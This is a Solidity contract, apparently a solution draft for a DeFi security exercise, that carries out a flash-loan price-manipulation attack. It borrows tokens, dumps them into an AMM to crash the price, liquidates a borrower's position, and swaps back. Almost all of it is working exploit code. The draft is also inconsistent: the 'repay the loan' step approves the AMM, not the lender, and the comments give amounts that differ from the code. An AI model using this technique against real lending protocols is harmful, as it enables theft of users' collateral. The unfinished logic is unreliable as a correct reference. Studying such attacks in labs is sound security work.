// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashLender.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import {console2} from "@forge-std/console2.sol";
import "./AMM.sol";
import "./FlashLoan.sol";
import "./CollateralToken.sol";

contract FlashLoanAttacker is IERC3156FlashBorrower {
    using SafeERC20 for IERC20;

    AMM public amm;
    FlashLender public flashLender;
    CollateralToken public tokenContract;
    Lending public lending;
    address public borrower;
    uint256 public counter;
    uint256 public tokenAmount;

    constructor(AMM _amm, FlashLender _flashLender, CollateralToken _token, address _borrower, Lending _lending) {
        amm = _amm;
        flashLender = _flashLender;
        tokenContract = _token;
        borrower = _borrower;
        lending = _lending;
    }

    function attack() public {
        IERC20(tokenContract).approve(address(flashLender), type(uint256).max);
        withdrawAllTheTokens();
        console2.log("balanceOfCollateralTokenNow in attacker:", IERC20(tokenContract).balanceOf(address(this)));
    }

    function withdrawAllTheTokens() public {
        //Step 1, get Flash Loan, maybe by abusing the 0 fee integer division thing
        console2.log("Step 1 get Flash Loan");
        flashLender.flashLoan(IERC3156FlashBorrower(address(this)), address(tokenContract), 500 ether, "");
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata data)
        external
        returns (bytes32)
    {
        console2.log("onFlashLoan entered");
        // Step 2.1.0: Transfer Tokens to AMM (state is not updated yet)
        SafeERC20.safeTransfer(IERC20(tokenContract), address(amm), 69 ether);
        // Step 2.1.1: How many tokens to transfer? (let's try 100 ether first)

        // Step 2.2.0: call swapTokensForEth, we give 100 ether for some amount of eth
        uint256 prevEthBalance = address(this).balance;
        uint256 ethAmountIn = amm.swapLendTokenForEth(address(this));
        console2.log("Amount of Eth Received:", ethAmountIn);
        // Step 3.1.0: Now that Price of Token has dropped, we call liquidate(borrower), that should will send
        uint256 prevTokenBalanceOfAttacker = tokenContract.balanceOf(address(this));
        console2.log("prevTokenBalanceOfAttacker:", prevTokenBalanceOfAttacker);
        lending.liquidate(borrower);
        uint256 currentTokenBalanceOfAttacker = tokenContract.balanceOf(address(this));
        console2.log("currentTokenBalanceOfAttacker:", currentTokenBalanceOfAttacker);
        // Step 4.1.0: Mission Accomplished right?, swap eth back for tokens.

        (bool success,) = address(amm).call{value: address(this).balance}("");
        require(success, "Failed to send ether to amm");
        amm.swapEthForLendToken(address(this));
        uint256 newTokenBalanceOfAttacker = tokenContract.balanceOf(address(this));
        //Step 5.1.0: Repay the loan
        console2.log("newTokenBalanceOfAttacker:", newTokenBalanceOfAttacker);
        IERC20(tokenContract).approve(address(amm), type(uint256).max);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    receive() external payable {
        console2.log("attacker received ether:", msg.value);
    }
}
// Step 2.1.0: Transfer Tokens to AMM (state is not updated yet)
// Step 2.1.1: How many tokens to transfer? (let's try 100 ether first)
// Step 2.2.0: call swapTokensForEth, we give 100 ether for some amount of eth
// Step 3.1.0: Now that Price of Token has dropped, we call liquidate(borrower), that should will send
// tokens to attacking contract
// Step 4.1.0: Mission Accomplished right?, swap eth back for tokens.
// Step 5.1.0: Repay the loan
//
